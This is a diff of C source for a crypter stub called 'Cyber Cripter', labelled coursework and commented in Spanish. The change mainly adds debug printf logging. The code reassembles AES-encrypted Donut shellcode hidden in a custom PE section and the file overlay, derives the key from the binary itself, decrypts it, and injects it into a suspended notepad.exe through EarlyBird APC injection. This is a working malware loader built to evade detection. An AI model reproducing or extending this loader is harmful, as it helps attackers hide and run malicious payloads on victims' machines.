@@ -1,14 +1,14 @@
 /*
  * Cyber Cripter — native stub (educational coursework).
  *
- * Este binario es la plantilla pre-compilada que el builder C# parchea.
+ * Este binario es la plantilla pre-compilada del loader que el builder C# parchea.
  * El layout en disco, tras el parcheo, es:
  *
  *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
  *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
- *                                   hash_region_size). Localizado via METADATA_MAGIC.
+ *                      hash_region_size). Localizado via METADATA_MAGIC.
  *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
- *                     del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
+ *                      del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
  *
  *   PE overlay (bytes en bruto tras la última sección del PE):
  *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
@@ -28,11 +28,13 @@
 #include <windows.h>
 #include <bcrypt.h>
 
+#include <stdio.h>
+
 #pragma comment(lib, "bcrypt.lib")
 
-/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
+/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (500 KiB).
    Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
-#define HALF1_MAX 0x100000
+#define HALF1_MAX 0x7D000
 
 /* Layout de los metadatos que el builder escribe en .cdata.
    #pragma pack(1) garantiza que no hay padding entre campos, lo cual es imprescindible
@@ -49,12 +51,12 @@ typedef struct {
 } StubMetadata;
 #pragma pack(pop)
 
-/* Forzar una sección propia (.cdata) para que el builder pueda localizar los datos
-   mediante los magic markers sin necesidad de parsear cabeceras PE. */
+// Se fuerza una sección propia (.cdata) para que el builder pueda localizar los datos
+// mediante los magic markers sin necesidad de parsear cabeceras PE. 
+   // Se puede considerar establecer Read & Write en un futuro, en caso que se desee actualizar el stub para que modifique el contenido de half1 durante la ejecución.
 #pragma section(".cdata", read)
 
-/* Plantilla de metadatos: todos los campos en cero, el builder los sobreescribe en el binario
-   antes de entregar el ejecutable cifrado al usuario. */
+// Se crea StubMetadata dentro de .cdata
 __declspec(allocate(".cdata"))
 volatile const StubMetadata g_meta = {
     /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
@@ -67,12 +69,7 @@ volatile const StubMetadata g_meta = {
     /* hash_region_size */ 0
 };
 
-/* Buffer que almacena la primera mitad del ciphertext (half1).
-   Los primeros 16 bytes son el magic que usa el builder para localizar el buffer.
-   El resto (HALF1_MAX bytes) lo sobreescribe el builder con los datos cifrados.
-   IMPORTANTE: el array completo debe estar inicializado en disco (no en BSS); si MSVC
-   lo trunca, el builder falla con "stub template too small". Para evitarlo, el inicializador
-   tiene bytes no-cero al final del array en la sección .cdata del stub real. */
+// Se crea buffer de datos dentro de .cdata de (16 + HALF1_MAX) Bytes
 __declspec(allocate(".cdata"))
 volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
     'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
@@ -93,8 +90,7 @@ volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
 static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }
 
 /**
- * @brief  Libera un bloque previamente reservado con xalloc. Sustituto de free sin CRT.
- *         No hace nada si p es NULL.
+ * @brief  Libera un bloque previamente reservado con xalloc. No hace nada si p es NULL.
  * @param[in]  p  Puntero al bloque a liberar (puede ser NULL).
  */
 static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }
@@ -105,17 +101,16 @@ static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }
  * @param[in]  src  Buffer de origen.
  * @param[in]  n    Número de bytes a copiar.
  */
-static void xcopy(void *dst, const void *src, SIZE_T n)
+static void xcopy(void *dst, const volatile void *src, SIZE_T n)
 {
     unsigned char *d = (unsigned char *)dst;
-    const unsigned char *s = (const unsigned char *)src;
+    const volatile unsigned char *s = (const volatile unsigned char *)src;
     while (n--) *d++ = *s++;
 }
 
 /**
  * @brief  Sobreescribe n bytes de p con ceros. Sustituto de memset seguro sin CRT.
- *         El puntero volatile impide que el compilador elimine el bucle como "código muerto",
- *         evitando que material criptográfico (clave AES, shellcode) quede expuesto en heap.
+ *         volatile impide al compilador eliminar el bucle como "código muerto".
  * @param[in,out] p  Buffer a borrar.
  * @param[in]     n  Número de bytes a poner a cero.
  */
@@ -129,10 +124,7 @@ static void xzero(void *p, SIZE_T n)
 
 /**
  * @brief  Lee el binario del stub completo desde disco usando GetModuleFileNameA.
- *         Necesario para (a) hashear los primeros hash_region_size bytes al derivar
- *         la clave AES y (b) acceder al overlay PE que contiene half2 del ciphertext.
- * @param[out] out       Dirección donde se escribe el puntero al buffer reservado con
- *                       el contenido del fichero. El llamador debe liberarlo con xfree().
+ *         Necesario para hashear el prefijo en la derivación de clave y para acceder al overlay (half2).
  * @param[out] out_size  Tamaño del fichero leído en bytes.
  * @return 1 si la lectura fue correcta, 0 en caso de cualquier error de Win32.
  */
@@ -235,7 +227,7 @@ static int cng_aes256cbc_decrypt(const unsigned char key[32],
     if (!pt) goto end;
 
     /* Segunda llamada: descifrado real con el buffer reservado.
-       Se restaura el IV porque BCryptDecrypt lo modificó en la llamada anterior. */
+       También se restaura el IV porque BCryptDecrypt lo modificó en la llamada anterior. */
     xcopy(iv, iv_in, 16);
     if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                       pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
@@ -276,31 +268,50 @@ static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
     si.cb = sizeof(si);
 
     /* Crear el proceso suspendido: el hilo primario queda bloqueado hasta ResumeThread */
-    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
+    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] Error: No se pudo crear el proceso suspendido (CreateProcessA). GetLastError=%lu\n", GetLastError());                    
+        return 0;
+    }
+    printf("[+] Proceso suspendido creado correctamente. PID=%lu, TID=%lu\n", pi.dwProcessId, pi.dwThreadId);
 
     /* Reservar memoria ejecutable en el espacio de direcciones del proceso remoto */
     rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                           MEM_COMMIT | MEM_RESERVE,
                           PAGE_READWRITE);
-    if (!rmem) goto fail;
+    if (!rmem) {
+        printf("[-] Error: No se pudo reservar memoria en el proceso remoto (VirtualAllocEx). GetLastError=%lu\n", GetLastError());
+        goto fail;
+    }
+    printf("[+] Memoria reservada correctamente en rmem=%p\n", rmem);
 
     /* Copiar el shellcode al proceso remoto */
-    if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
-        || written != sc_len) goto fail;
+    if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written) || written != sc_len) {
+        printf("[-] Error: No se pudo escribir el shellcode en el proceso remoto (WriteProcessMemory). GetLastError=%lu\n", GetLastError());
+        goto fail;
+    }
+    printf("[+] Shellcode copiado correctamente.\n");
 
+    DWORD oldProtect = 0;
     /* Cambiar permisos a ejecutable después de escribir el shellcode */
-    if (!VirtualProtectEx(pi.hProcess, rmem, sc_len,
-                          PAGE_EXECUTE_READ, NULL)) goto fail;
+    if (!VirtualProtectEx(pi.hProcess, rmem, sc_len, PAGE_EXECUTE_READ, &oldProtect)) {
+        printf("[-] Error: No se pudo cambiar los permisos de memoria (VirtualProtectEx). GetLastError=%lu\n", GetLastError());
+        goto fail;
+    }
+    printf("[+] Permisos de memoria cambiados correctamente a PAGE_EXECUTE_READ\n");
 
     /* Encolar la APC en el hilo primario antes de reanudarlo.
        El APC dispara cuando el hilo entre en una espera alertable (NtTestAlert loop),
        lo que ocurre muy al inicio de la carga de notepad.exe, de ahí el nombre EarlyBird. */
-    if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;
+    if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) {
+        printf("[-] Error: No se pudo encolar la APC (QueueUserAPC). GetLastError=%lu\n", GetLastError());
+        goto fail;
+    }
+    printf("[+] APC encolada correctamente\n");
 
     /* Reanudar el hilo: a partir de aquí el hilo ejecutará la APC (shellcode) en lugar
        de seguir con la inicialización normal del proceso. */
     ResumeThread(pi.hThread);
+    printf("[+] Hilo reanudado correctamente\n");
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return 1;
@@ -360,8 +371,22 @@ fail:
 //     return 0;
 // }
 
-/* ---------- punto de entrada ---------- */
+/* ----------DEBUG---------*/
+static void init_console(void)
+{
+    if (!AttachConsole(ATTACH_PARENT_PROCESS))
+        AllocConsole();
 
+    FILE *fp;
+
+    freopen_s(&fp, "CONOUT$", "w", stdout);
+    freopen_s(&fp, "CONOUT$", "w", stderr);
+    freopen_s(&fp, "CONIN$",  "r", stdin);
+
+    SetConsoleOutputCP(CP_UTF8);
+}
+
+/* --------MAIN-------- */
 /**
  * @brief  Punto de entrada del stub. Orquesta los cinco pasos del flujo completo:
  *         lectura propia → derivación de clave AES → remontar ciphertext →
@@ -376,60 +401,91 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    /* Paso 1: leer el propio binario desde disco para (a) obtener la región de hash
-       anti-tamper y (b) acceder al overlay PE que contiene half2. */
+    // UNCOMMENT THIS LINE FOR DEBUGGING
+    init_console();
+
+    /* Paso 1: leer el propio binario desde disco */
     unsigned char *self = NULL;
     DWORD self_size = 0;
-    if (!read_self(&self, &self_size)) return 1;
+    if (!read_self(&self, &self_size)) {
+        printf("[-] Error: No se pudo leer el binario desde disco.\n");
+        return 1;
+    }
 
     DWORD hr = g_meta.hash_region_size;
     DWORD h1 = g_meta.half1_size;
     DWORD h2 = g_meta.half2_size;
 
     /* Validar que los metadatos tienen sentido antes de usarlos como índices de memoria */
-    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size
-        || (h1 + h2) < h1) {
-        xfree(self); return 2;
+    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size || (h1 + h2) < h1) {
+        printf("[-] Error: Datos de metadatos inválidos (hash_region_size=%u, half1_size=%u, half2_size=%u, self_size=%u)\n",
+               hr, h1, h2, self_size);
+        xfree(self); 
+        return 2;
     }
+    printf("[+] 1. Binario leido desde el disco.\n");
 
-    /* Paso 2: Construir la clave AES.
-       Formato: heap_marker(8) || self[0..hr] || timestamp(8 bytes LE).
-       El builder C# calcula exactamente el mismo hash sobre el template sin parchear,
-       por lo que ambos extremos convergen en la misma clave si el fichero no ha sido modificado. */
+
+    /* Paso 2: derivar la clave AES = SHA256(heap_marker || self[0..hr] || timestamp) */
     DWORD hin_len = 8 + hr + 8;
     unsigned char *hin = (unsigned char *)xalloc(hin_len);
-    if (!hin) { xfree(self); return 3; }
-    xcopy(hin,            (const void *)g_meta.heap_marker, 8);
+    if (!hin) { 
+        printf("[-] Error: No se pudo asignar memoria para hin.\n");
+        xfree(self); 
+        return 3; 
+    }
+
+    xcopy(hin,            g_meta.heap_marker, 8);
     xcopy(hin + 8,        self, hr);
-    xcopy(hin + 8 + hr,   (const void *)&g_meta.timestamp, 8);
+    xcopy(hin + 8 + hr,   (const volatile unsigned char *)&g_meta.timestamp, 8);
 
     unsigned char key[32];
     int ok = cng_sha256(hin, hin_len, key);
     xzero(hin, hin_len); xfree(hin); /* borrar el buffer intermedio del heap */
-    if (!ok) { xfree(self); return 4; }
+    if (!ok) { 
+        printf("[-] Error: Falló el cálculo de SHA256 para la clave.\n");
+        xfree(self); 
+        return 4; 
+    }
 
-    /* Paso 3: remontar el ciphertext completo = half1 (embebido en .cdata) || half2 (overlay PE).
-       half1 empieza 16 bytes después del magic de g_half1_buf (los 16 bytes del magic se saltan).
-       half2 son los últimos h2 bytes del fichero en disco (el overlay que añadió el builder). */
+    printf("[+] 2. Clave leida desde el disco: \n");
+    for (int i = 0; i < 32; i++) printf("%02X", key[i]);
+    printf("\n");
+
+
+    /* Paso 3: remontar el ciphertext completo = half1 (embebido en .cdata) || half2 (overlay PE).*/
     DWORD ct_len = h1 + h2;
     unsigned char *ct = (unsigned char *)xalloc(ct_len);
-    if (!ct) { xzero(key, 32); xfree(self); return 5; }
-    xcopy(ct,        (const void *)(g_half1_buf + 16), h1);
+    if (!ct) { 
+        printf("[-] Error: No se pudo asignar memoria para el ciphertext.\n");
+        xzero(key, 32); 
+        xfree(self); 
+        return 5; 
+    }
+    xcopy(ct,        (g_half1_buf + 16), h1);
     xcopy(ct + h1,   self + (self_size - h2), h2);
     xfree(self); /* ya no necesitamos el fichero en memoria */
+    printf("[+] 3. Ciphertext reconstruido.\n");
 
-    /* Extraer el IV de los metadatos antes de descifrar */
-    unsigned char iv[16];
-    xcopy(iv, (const void *)g_meta.iv, 16);
-
+    
     /* Paso 4: descifrar el ciphertext con AES-256-CBC -> shellcode Donut */
+
+    // Extraer el IV de los metadatos
+    unsigned char iv[16];
+    xcopy(iv, g_meta.iv, 16);
+
     unsigned char *sc = NULL;
     DWORD sc_len = 0;
     ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);
 
     /* Limpiar material criptográfico del heap inmediatamente tras el descifrado */
     xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
-    if (!ok) return 6;
+    if (!ok) {
+        printf("[-] Error: Falló el descifrado AES-256-CBC.\n");
+        return 6;
+    }
+
+    printf("[+] 4. Descifrado del código completado.\n");
 
     /* Paso 5: inyectar el shellcode en notepad.exe mediante EarlyBird APC */
     eb_apc_inject(sc, sc_len);
@@ -441,5 +497,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
        este proceso termine (si termina primero el proceso que inyectó también puede
        limpiar handles, pero la APC ya está encolada en el proceso remoto). */
     Sleep(2000);
+
+    printf("[+] 5. EarlyBird APC completada.\n");
     return 0;
 }
